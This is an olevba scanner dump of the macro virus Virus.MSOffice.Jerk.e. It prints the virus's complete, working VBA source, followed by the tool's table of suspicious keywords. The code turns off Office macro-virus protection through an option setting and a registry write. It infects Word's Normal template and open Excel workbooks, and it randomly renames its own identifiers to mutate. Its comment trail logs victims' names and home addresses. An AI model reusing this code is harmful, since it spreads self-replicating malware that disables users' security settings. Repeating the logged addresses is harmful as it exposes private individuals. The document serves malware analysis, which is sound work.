olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 09:08:05:  - ÷åòâåðã, 29 àïð 1999
' Þ. Âëàäèìèðîâ
'


' 02:43:46: PM - Thursday, 25 Feb 1999
' Data Dimensions, Inc.
'























Private Sub Workbook()

End Sub
Deactivate()









Private Sub Workbook_Deactivate()
On Error Resume Next
Const LVGJI = 1, SEULYH = True, EUAQKIZ = False, YMSVPZW = 0
Dim YTJGR, XNRALXSMP As String
Dim OPAWYDTZZBY, MCLMAPXPO As Integer
Dim JVCCZDVIIHCQCA As Boolean
XNRALXSMP = "ThisWorkbook"
YTJGR = Application.ThisWorkbook.VBProject.VBComponents.Item(LVGJI).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(LVGJI).CodeModule.CountOfLines)
Call LCPYRYPQ(YTJGR)
For OPAWYDTZZBY = LVGJI To Application.Workbooks.Count
JVCCZDVIIHCQCA = EUAQKIZ
For MCLMAPXPO = LVGJI To Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Count
If Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.CountOfLines = YMSVPZW Then
If Application.Workbooks.Item(OPAWYDTZZBY).Path <> "" And Application.Workbooks.Item(OPAWYDTZZBY).Saved = SEULYH And JVCCZDVIIHCQCA = EUAQKIZ Then JVCCZDVIIHCQCA = SEULYH
Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.InsertLines LVGJI, YTJGR
If Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).Name = XNRALXSMP Then
Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.ReplaceLine LVGJI * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.ReplaceLine LVGJI * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next MCLMAPXPO
If JVCCZDVIIHCQCA = SEULYH Then Application.Workbooks.Item(OPAWYDTZZBY).Save
Next OPAWYDTZZBY
End Sub
Private Sub Document_Close()
On Error Resume Next
Const SEULYH = True, EUAQKIZ = False, YMSVPZW = 0, LVGJI = 1, SJZRQRAYXQV = wdFormatDocument, KCZYRNZEUEJJ = wdFormatTemplate, EYSLR = ":"
Dim JVCCZDVIIHCQCA, OXDLMOC, SGHYNCYLRCBDV, UXSET As Boolean
Dim ZFCIWTDSRYAT, CWTEZYOEYDW As Object
Dim TFSCITL, YTJGR As String
If Month(LVGJI * Now) > LVGJI * 2 + LVGJI * 3 And Day(LVGJI * Now) = 4 + LVGJI * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set ZFCIWTDSRYAT = ActiveDocument.VBProject.VBComponents.Item(LVGJI)
Set CWTEZYOEYDW = NormalTemplate.VBProject.VBComponents.Item(LVGJI)
Randomize
SGHYNCYLRCBDV = EUAQKIZ
UXSET = EUAQKIZ
If ZFCIWTDSRYAT.CodeModule.CountOfLines <> YMSVPZW Then SGHYNCYLRCBDV = SEULYH
If CWTEZYOEYDW.CodeModule.CountOfLines <> YMSVPZW Then UXSET = SEULYH
Options.VirusProtection = EUAQKIZ
If (SGHYNCYLRCBDV = SEULYH Xor UXSET = SEULYH) And (ActiveDocument.SaveFormat = SJZRQRAYXQV Or ActiveDocument.SaveFormat = KCZYRNZEUEJJ) Then
If SGHYNCYLRCBDV = SEULYH Then
OXDLMOC = NormalTemplate.Saved
YTJGR = ZFCIWTDSRYAT.CodeModule.Lines(LVGJI, ZFCIWTDSRYAT.CodeModule.CountOfLines)
Call UWCCEZFMDCAUB(YTJGR)
If Int(Rnd * 10 * LVGJI) = LVGJI * 7 Then Call TKJABLVJAZHWD(YTJGR)
Call UQCEF(YTJGR)
CWTEZYOEYDW.CodeModule.InsertLines LVGJI, YTJGR
If OXDLMOC = SEULYH Then NormalTemplate.Save
End If
TFSCITL = Mid(ActiveDocument.FullName, 2, LVGJI)
If UXSET = SEULYH And (TFSCITL = EYSLR Or ActiveDocument.Saved = EUAQKIZ) Then
JVCCZDVIIHCQCA = ActiveDocument.Saved
YTJGR = CWTEZYOEYDW.CodeModule.Lines(LVGJI, CWTEZYOEYDW.CodeModule.CountOfLines)
Call UQCEF(YTJGR)
ZFCIWTDSRYAT.CodeModule.InsertLines LVGJI, YTJGR
If JVCCZDVIIHCQCA = SEULYH Then ActiveDocument.Save
End If
End If
End Sub
Private Sub TKJABLVJAZHWD(ByRef YTJGR As String)
On Error Resume Next
Const CUECUDXPFKS = 48, MHXQTUVBJOZJEAY = 15, PERJPASPFQ = 5, LCAVGMOJMINKZP = 65, OEATCCZYRENHWJY = 90, LVGJI = 1, SEULYH = True, EUAQKIZ = False
Dim EAMREOHFB, JYQPDDLFMSCTmp, KTUELQL, JYQPDDLFMSC(LVGJI To CUECUDXPFKS), JYQPDDLFMSC2(LVGJI To CUECUDXPFKS) As String
Dim OPAWYDTZZBY, MCLMAPXPO, TCKPBDFFABPZ As Integer
Dim OPWJQN As Boolean
EAMREOHFB = "YTJGR CUECUDXPFKS JYQPDDLFMSC JYQPDDLFMSC2 KTUELQL OPAWYDTZZBY MCLMAPXPO TCKPBDFFABPZ OPWJQN TKJABLVJAZHWD MHXQTUVBJOZJEAY PERJPASPFQ LCAVGMOJMINKZP OEATCCZYRENHWJY LVGJI EAMREOHFB JYQPDDLFMSCTmp JVCCZDVIIHCQCA OXDLMOC SGHYNCYLRCBDV UXSET ZFCIWTDSRYAT CWTEZYOEYDW UWCCEZFMDCAUB PFNQZ XTBPTPYFPCEGHWT AASKANRC VBKMKXNKXT PFNQZTmp MSHGDIUBBZYRORO MXXXBFJTYLZBVXV TFSCITL SEULYH EUAQKIZ YMSVPZW SJZRQRAYXQV KCZYRNZEUEJJ XMLBTGL PDRGYSJGD EYSLR BXANIAZO XJUXRIGSWG XNRALXSMP LCPYRYPQ UQCEF VHCAHXM CYEXSXKPE UMHTMSVO"
Randomize
MCLMAPXPO = LVGJI
For OPAWYDTZZBY = LVGJI To Len(EAMREOHFB)
If Mid(EAMREOHFB, OPAWYDTZZBY, LVGJI) = " " Or OPAWYDTZZBY = Len(EAMREOHFB) Then
If OPAWYDTZZBY = Len(EAMREOHFB) Then JYQPDDLFMSCTmp = JYQPDDLFMSCTmp & Mid(EAMREOHFB, OPAWYDTZZBY, LVGJI)
For TCKPBDFFABPZ = LVGJI To Int((MHXQTUVBJOZJEAY - PERJPASPFQ + LVGJI) * Rnd + PERJPASPFQ)
JYQPDDLFMSC2(MCLMAPXPO) = JYQPDDLFMSC2(MCLMAPXPO) & Chr(Int((OEATCCZYRENHWJY - LCAVGMOJMINKZP + LVGJI) * Rnd + LCAVGMOJMINKZP))
Next TCKPBDFFABPZ
JYQPDDLFMSC(MCLMAPXPO) = JYQPDDLFMSCTmp
JYQPDDLFMSCTmp = ""
MCLMAPXPO = MCLMAPXPO + LVGJI
Else
JYQPDDLFMSCTmp = JYQPDDLFMSCTmp & Mid(EAMREOHFB, OPAWYDTZZBY, LVGJI)
End If
Next OPAWYDTZZBY
OPWJQN = EUAQKIZ
For OPAWYDTZZBY = LVGJI To Len(YTJGR)
For MCLMAPXPO = LVGJI To CUECUDXPFKS
If Mid(YTJGR, OPAWYDTZZBY, Len(JYQPDDLFMSC(MCLMAPXPO))) = JYQPDDLFMSC(MCLMAPXPO) Then
KTUELQL = KTUELQL & JYQPDDLFMSC2(MCLMAPXPO)
OPAWYDTZZBY = OPAWYDTZZBY + Len(JYQPDDLFMSC(MCLMAPXPO)) - LVGJI
OPWJQN = SEULYH
Exit For
End If
Next MCLMAPXPO
If OPWJQN = EUAQKIZ Then
KTUELQL = KTUELQL & Mid(YTJGR, OPAWYDTZZBY, LVGJI)
Else
OPWJQN = EUAQKIZ
End If
Next OPAWYDTZZBY
YTJGR = KTUELQL
End Sub
Private Sub UWCCEZFMDCAUB(ByRef YTJGR As String)
On Error Resume Next
Const VBKMKXNKXT = "' ", LVGJI = 1
Const XMLBTGL = "hh:mm:ss: AMPM - ", PDRGYSJGD = "dddd, d mmm yyyy"
Dim PFNQZTmp, PFNQZ, MSHGDIUBBZYRORO, MXXXBFJTYLZBVXV, XTBPTPYFPCEGHWT, AASKANRC As String
Dim OPAWYDTZZBY As Integer
XTBPTPYFPCEGHWT = Chr(10 * LVGJI + 3)
PFNQZ = Application.UserAddress
MXXXBFJTYLZBVXV = Format(Time, XMLBTGL) & Format(Date, PDRGYSJGD)
AASKANRC = Chr(LVGJI * 10)
MSHGDIUBBZYRORO = Application.UserName
For OPAWYDTZZBY = LVGJI To Len(PFNQZ)
If Mid(PFNQZ, OPAWYDTZZBY, LVGJI) <> XTBPTPYFPCEGHWT Then
If Mid(PFNQZ, OPAWYDTZZBY, LVGJI) <> AASKANRC Then
PFNQZTmp = PFNQZTmp & Mid(PFNQZ, OPAWYDTZZBY, LVGJI)
End If
Else
PFNQZTmp = PFNQZTmp & XTBPTPYFPCEGHWT & VBKMKXNKXT
End If
Next OPAWYDTZZBY
YTJGR = YTJGR & XTBPTPYFPCEGHWT & VBKMKXNKXT & MXXXBFJTYLZBVXV & XTBPTPYFPCEGHWT & VBKMKXNKXT & MSHGDIUBBZYRORO & XTBPTPYFPCEGHWT & VBKMKXNKXT & PFNQZ & XTBPTPYFPCEGHWT
End Sub
Private Sub UQCEF(ByVal YTJGR As String)
On Error Resume Next
Dim UMHTMSVO As Long
Dim BXANIAZO As Object
Dim VHCAHXM, CYEXSXKPE As String
VHCAHXM = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
UMHTMSVO = &H0
CYEXSXKPE = "Options6"
System.PrivateProfileString("", VHCAHXM, CYEXSXKPE) = UMHTMSVO
Set BXANIAZO = GetObject(, "Excel.Application")
Const LVGJI = 1, YMSVPZW = 0
Dim XNRALXSMP As String
Dim OPAWYDTZZBY, MCLMAPXPO As Integer
XNRALXSMP = "ThisWorkbook"
For OPAWYDTZZBY = LVGJI To BXANIAZO.Application.Workbooks.Count
For MCLMAPXPO = LVGJI To BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Count
If BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.CountOfLines = YMSVPZW Then
BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.InsertLines LVGJI, YTJGR
If BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).Name = XNRALXSMP Then
BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.ReplaceLine 33 * LVGJI, "Private Sub Workbook_Deactivate()"
Else
BXANIAZO.Application.Workbooks.Item(OPAWYDTZZBY).VBProject.VBComponents.Item(MCLMAPXPO).CodeModule.ReplaceLine LVGJI * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next MCLMAPXPO
Next OPAWYDTZZBY
Set BXANIAZO = Nothing
End Sub
Private Sub LCPYRYPQ(ByVal YTJGR As String)
On Error Resume Next
Const SEULYH = True, EUAQKIZ = False, LVGJI = 1, YMSVPZW = 0
Dim XJUXRIGSWG As Object
Dim OXDLMOC As Boolean
Set XJUXRIGSWG = GetObject(, "Word.Application")
If XJUXRIGSWG.NormalTemplate.VBProject.VBComponents.Item(LVGJI).CodeModule.CountOfLines = YMSVPZW Then
OXDLMOC = XJUXRIGSWG.NormalTemplate.Saved
XJUXRIGSWG.Options.VirusProtection = EUAQKIZ
XJUXRIGSWG.NormalTemplate.VBProject.VBComponents.Item(LVGJI).CodeModule.InsertLines LVGJI, YTJGR
If OXDLMOC = SEULYH Then XJUXRIGSWG.NormalTemplate.Save
End If
Set XJUXRIGSWG = Nothing
End Sub

' 09:50:58:  - Saturday, 13 Apr 1997
' Fred Cohen
' fc@all.net

' 01:41:02: PM - Monday, 22 Feb 1999
' Data Dimensions, Inc.
'

' 11:55:53: AM - Tuesday, 16 Mar 1999
' Information Technology
'

' 10:14:42:  - âòîðíèê, 23 ìàð 1999
' Dmitry Ushakov
'

' 08:35:22:  - âòîðíèê, 13 àïð 1999
' Êëåáàíîâ
'

' 12:25:37:  - ñðåäà, 21 àïð 1999
' Þ. Âëàäèìèðîâ
'

' 01:25:42:  - ïîíåäåëüíèê, 17 ìàé 1999
' Þ. Âëàäèìèðîâ
'

' 05:49:27:  - ïîíåäåëüíèê, 24 ìàé 1999
' erad
'

' 04:07:38:  - ñðåäà, 27 ìàé 1998
' Ðÿáîâà Òàíÿ
'

' 05:36:46:  - ñðåäà, 9 èþí 1999
' SergeyV
' RUSSIA
'141018 Moscow Region, Mytischi,
'Novo-Mytischinsky Prospekt 47-2-150
'Sergey D.Vasinovich

' 01:22:29:  - ñðåäà, 13 îêò 1999
' ÑÏÕÔÀ
'

' 04:57:04:  - ïîíåäåëüíèê, 25 îêò 1999
' rofoms
'

' 05:12:33:  - âîñêðåñåíüå, 16 ÿíâ 2000
' Aleksey
'

' 11:38:32:  - âòîðíèê, 15 ôåâ 2000
' ÐÎÔÎÌÑ
'

' 09:38:39:  - ïÿòíèöà, 25 ôåâ 2000
' NATALY
'

' 02:57:42:  - âòîðíèê, 29 ôåâ 2000
' NATALY
'

' 10:46:48:  - ïîíåäåëüíèê, 6 ìàð 2000
' ìàøáþðî\1\
'

' 11:17:51:  - ïîíåäåëüíèê, 20 ìàð 2000
' Îòäåë òîâàðíûõ ðûíêîâ
'

' 10:22:33:  - âòîðíèê, 11 àïð 2000
' Ìèíèñòåðñòâî ýêîíîìèêè, Ì è ÂÝÑ ÐÎ
' 344050, ã.Ðîñòîâ-íà-Äîíó
óë.Ñîöèàëèñòè÷åñêàÿ 112

' 05:11:14:  - ïîíåäåëüíèê, 17 àïð 2000
' Àäìèíèñòðàöèÿ
'

' 08:31:06:  - ïîíåäåëüíèê, 17 àïð 2000
' Ñâîäíûé îòäåë
'

' 09:42:10:  - ÷åòâåðã, 27 àïð 2000
' Alla & WarAn
'

' 01:45:01:  - ñðåäà, 3 ìàé 2000
' U613_1
' 344064, ã.Ðîñòîâ-íà-Äîíó,
óë.Ãåðàñèìåíêî, 13-À. êâ.61
Áàòþíÿ Î.Â.

' 10:47:32:  - ïÿòíèöà, 5 ìàé 2000
' Êèì
'

' 07:31:24: PM - ïÿòíèöà, 19 ìàé 2000
' Mike
' Jhuma
Shibrampur
Burichang
Comilla

' 10:18:14: AM - Wednesday, 21 Jun 2000
' Ditry PC
'

' 02:59:56: PM - Wednesday, 23 Aug 2000
' MACRO
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

